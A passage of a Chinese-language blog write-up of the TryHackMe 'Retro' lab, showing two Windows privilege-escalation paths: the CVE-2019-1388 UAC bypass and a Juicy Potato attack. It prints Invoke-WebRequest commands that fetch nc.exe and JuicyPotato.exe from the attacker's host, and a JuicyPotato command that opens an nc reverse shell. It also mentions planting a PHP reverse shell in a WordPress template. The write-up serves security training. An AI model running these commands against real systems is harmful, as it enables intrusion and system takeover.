<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145203.png" alt="image-20240708104045911"></p>
<p>这里我利用图形化的remmina也是成功登陆上去</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145204.png" alt="image-20240708104623568"></p>
<h2 id="提权方法一">提权方法一</h2>
<p>在上述情况下，就要想到Windows主机的提权了，不过这里我并不知道如何下手，只能马后炮了。我们先看一下tryhackme给出的hint</p>
<pre><code class="hljs plaintext">弄清楚用户最后想要寻找什么。否则，就把这个放在冰上，然后给自己找一个更好的壳，也许是浸过毒液的壳。</code></pre>
<p>根据这个提示，我们可以看一下浏览器的历史记录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145205.png" alt="image-20240708111910236"></p>
<p>看到这里显示了CVE-2019-1388，Google一下</p>
<pre><code class="hljs scss">该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent<span class="hljs-selector-class">.exe</span>的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。

利用该漏洞很容易就可以提升权限到SYSTEM。</code></pre>
<p>利用过程如下，虽然这个靶机删除了exe利用程序，但我们可以在回收站找到他</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145206.png" alt="image-20240708112315210"></p>
<p>我们右键以管理员身份运行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145207.png" alt="image-20240708112345868"></p>
<p>再点击“显示更多详细信息”→“显示发布者的证书信息”→“颁发者”→“Internet Explorer”。</p>
<p>不过这里我显示不了Internet Explorer，这里文章说是Windows Server 2016 中故意激活的错误，因此我暂时就复现不了了，这里放个成功的例子</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145208.png" alt="image-20240708113207876"></p>
<p>接着我们关闭窗口，就应该能发现开启了IE浏览器页面，在其中我们ctrl+s打开文本对话框，然后导航到C:\Windows\System32*.*</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145209.png" alt="image-20240708113251258"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145210.png" alt="image-20240708113324335"></p>
<p>找到cmd之后，双击打开，即可发现我们是管理员的身份运行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145211.png" alt="image-20240708113354387"></p>
<h2 id="提权方法二">提权方法二</h2>
<p>这里就利用了刚刚的wordpress的渗透，首先看帖子，我们得知了用户名和密码，那可以尝试登陆后台，果不其然成功登录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145212.png" alt="image-20240708113652083"></p>
<p>如上图所示，我们可以通过编辑php模板文件，这里我最后编辑的是index.php，但值得注意的是上传的reverse_shell文件我们需要符合Windows的格式。Google了一下发现这个项目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ivan-sincek/php-reverse-shell">https://github.com/ivan-sincek/php-reverse-shell</a></p>
<p>复制上述的shell内容，粘贴之后，访问首页，同时kali开启nc监听即可。</p>
<p>然后我们可以执行systeminfo得到具体系统信息，在线辅助网站查询一下得知有众多漏洞，如下图我们利用的是ms16-075</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145213.png" alt="image-20240708121047591"></p>
<p>具体用户权限信息如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145214.png" alt="image-20240708121108997"></p>
<p>由此可知，是一个烂土豆提权。搜索文章，有如下规则：</p>
<pre><code class="hljs scss">Windows <span class="hljs-number">10</span> <span class="hljs-number">1809</span> &gt;= &amp; Windows Server <span class="hljs-number">2019</span> - Try Rogue Potato.
&lt; Windows <span class="hljs-number">10</span> <span class="hljs-number">1809</span>, &lt; Windows Server <span class="hljs-number">2019</span> - Try Juicy Potato.</code></pre>
<p>由上述systeminfo可知，我们这里利用Juicy Potato进行提权，google一下，下载上相关文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145215.png" alt="image-20240708121709912"></p>
<pre><code class="hljs scss">Invoke-WebRequest -Uri http://<span class="hljs-number">10.14</span>.<span class="hljs-number">79.125</span>:<span class="hljs-number">8000</span>/nc.exe -OutFile C:\temp\nc.exe
Invoke-WebRequest -Uri http://<span class="hljs-number">10.14</span>.<span class="hljs-number">79.125</span>:<span class="hljs-number">8000</span>/JuicyPotato.exe -OutFile C:\temp\JuicyPotato.exe</code></pre>
<p>这里是最磨人的地方，这里我一直下载文件，虽然命令可以执行， 但是始终看不到文件在哪，然后看了几篇文章，我尝试新建个目录，发现可以了。这让我怀疑，之前的目录，我的wade用户没有保存文件的权限导致的。</p>
<p>最后新建了C:\temp目录，之后上传需要的exe文件。</p>
<p>之后根据教程：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato?ref=hailstormsec.com">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato?ref=hailstormsec.com</a></p>
<p>执行如下所示的命令，同时kali开启监听， 最终得到system权限</p>
<pre><code class="hljs scss">./JuicyPotato<span class="hljs-selector-class">.exe</span> -l <span class="hljs-number">1337</span> -c "{F7FD3FD6-<span class="hljs-number">9994</span>-<span class="hljs-number">452</span>D-<span class="hljs-number">8</span>DA7-<span class="hljs-number">9</span>A8FD87AEEF4}" -<span class="hljs-selector-tag">p</span> c:\windows\system32\cmd.exe -a <span class="hljs-string">"/c c:\temp\nc.exe -e cmd.exe 10.14.79.125 8888"</span> -t *</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145216.png" alt="image-20240708142314885"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145217.png" alt="image-20240708142400970"></p>
<h2 id="killchain-summary">KillChain Summary</h2>
<p>首先常规枚举，发现80和3389，然后访问web站点，进行目录扫描，发现retro隐藏目录，访问之后发现是wordpress，随后尝试wpscan利用，但是弄了半天没有结果，需要转换思路。</p>
<p>信息搜集：找发布的贴子，发现用户名wade和一个密码，之后，尝试利用这个进行rdp登录和web网站后台登录。发现均可以登陆上去，其中RDP能够获得当前用户权限。后台网站的话，通过编辑模板文件，拿到Windows的shell，接着systeminfo枚举系统信息，发现存在诸多漏洞，同时配合whoami \priv命令显示出的账户权限信息，我们锁定了juicy potato提权。</p>
<p>另一种是，我们RDP连接之后，继续信息搜集，不难发现浏览器存在CVE的信息，该漏洞是CVE-2019-1388，实际上就是一个bypass UAC的漏洞。具体漏洞原理可参考：<a target="_blank" rel="noopener" href="https://drunkmars.top/2021/06/01/UAC%E6%8F%90%E6%9D%83/">CVE-2019-1388 UAC提权</a></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://muirlandoracle.co.uk/2020/01/06/retro-write-up/">RETRO — WRITE-UP</a></p>
<p><a target="_blank" rel="noopener" href="https://hailstormsec.com/retro/#tasks">Retro - TryHackMe</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/">i春秋CTF刷题</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/03/27/nustctf/">NUSTCTF</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-vulnversity%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x01 vulnversity漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A6%E6%9F%A5"><span class="toc-text">侦查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gobuste%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-text">使用gobuste扫描目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">入侵网络服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-blue%E6%8C%91%E6%88%98"><span class="toc-text">0x02 blue挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A6%E6%9F%A5"><span class="toc-text">侦查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-text">访问获取权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-text">提升权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3"><span class="toc-text">破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-kenobi%E6%8C%91%E6%88%98"><span class="toc-text">0x03 Kenobi挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEsamba%E5%85%B1%E4%BA%AB"><span class="toc-text">枚举Samba共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-proftpd-%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-text">使用 ProFtpd 获得初始访问权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87path%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-text">通过PATH变量提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-steel-mountain%E6%8C%91%E6%88%98"><span class="toc-text">0x04 Steel Mountain挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-text">初始访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E4%BD%BF%E7%94%A8metasploit%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%B9%B6%E6%8F%90%E6%9D%83"><span class="toc-text">不使用Metasploit获取初始访问权限并提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-alfred%E6%8C%91%E6%88%98"><span class="toc-text">0x05 Alfred挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-text">初始访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%87%E6%8D%A2shell"><span class="toc-text">切换shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-hackpark%E6%8C%91%E6%88%98"><span class="toc-text">0x06 HackPark挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">hydra暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%9D%E5%A7%8Bshell"><span class="toc-text">获取目标web应用程序的初始shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89-metasploit-%E7%9A%84%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7"><span class="toc-text">没有 Metasploit 的权限升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-game-zone%E6%8C%91%E6%88%98"><span class="toc-text">0x07 Game Zone挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87sqli%E8%8E%B7%E5%8F%96%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-text">通过SQLi获取访问权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap"><span class="toc-text">使用SQLmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-johntheripper-%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-text">使用 JohnTheRipper 破解密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91-ssh-%E9%9A%A7%E9%81%93%E6%9A%B4%E9%9C%B2%E7%9B%AE%E6%A0%87%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1"><span class="toc-text">使用反向 SSH 隧道暴露目标隐藏服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E5%88%B0root"><span class="toc-text">提升权限到root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-skynet%E6%8C%91%E6%88%98"><span class="toc-text">0x08 Skynet挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tar%E9%80%9A%E9%85%8D%E7%AC%A6%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">Tar通配符漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-daily-bugle"><span class="toc-text">0x09 Daily Bugle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-text">初始访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#john%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">john暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%8E%B7%E5%BE%97shell"><span class="toc-text">msf获得shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-text">切换用户提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-overpass-2-hacked"><span class="toc-text">0x10 Overpass 2 - Hacked</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E8%AF%81-%E5%88%86%E6%9E%90-pcap"><span class="toc-text">取证-分析 PCAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-text">研究-分析代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-%E9%87%8D%E6%96%B0%E8%BF%9B%E5%85%A5"><span class="toc-text">攻击-重新进入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-relevant"><span class="toc-text">0x11 Relevant</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%A6%81%E6%B1%82"><span class="toc-text">渗透测试要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%89%AB%E6%8F%8F"><span class="toc-text">常规扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%AB%99%E7%82%B9%E6%8E%A2%E6%B5%8B"><span class="toc-text">Web站点探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%90%91shell"><span class="toc-text">SMB上传反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83"><span class="toc-text">Windows令牌提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-internal"><span class="toc-text">0x12 Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%BB%E5%8A%A1"><span class="toc-text">渗透测试任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%89%AB%E6%8F%8F"><span class="toc-text">常规扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wordpress%E6%B8%97%E9%80%8F"><span class="toc-text">wordpress渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bshell"><span class="toc-text">建立shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%8F%90%E6%9D%83user"><span class="toc-text">密码泄露提权user</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%8B%BF%E4%B8%8B%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-text">ssh端口转发拿下内网主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">hydra暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%8F%90%E6%9D%83root"><span class="toc-text">密码泄露提权root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-brainstorm"><span class="toc-text">0x13 Brainstorm</span></a><ol class="toc-child"><li class="toc-item 